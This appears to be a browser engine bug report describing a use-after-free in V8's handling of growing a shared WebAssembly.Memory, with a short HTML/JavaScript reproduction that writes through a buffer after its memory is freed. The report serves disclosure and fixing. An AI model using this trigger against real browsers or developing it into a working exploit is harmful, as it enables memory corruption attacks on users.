When `Grow` is called on a `WebAssembly.Memory` object that's backed by a `SharedArrayBuffer`, it
uses the buffer's backing store pointer to construct a new array buffer[1]. Calling `Detach` on
shared buffers is prohibited by the spec, so the the method just leaves the old one as it is. Thus
two array buffers might end up owning the same backing store, and if one of the them got garbage
collected, the other one would point to a freed memory region.

Blink's SharedArrayBuffer implementation uses reference-counted backing stores, so v8 should
probably implement something similar.

REPRODUCTION CASE
-->

<script>
function gc() {
  for (let i = 0; i < 50; ++i) {
    let buffer = new ArrayBuffer(1024 * 1024);
  }
}

setInterval(() => {
  memory = new WebAssembly.Memory({initial: 1, maximum: 2, shared: true});
  memory.grow(1);
  gc();
  array = new Int8Array(memory.buffer);
  array[0x1337] = 1;
});
</script>
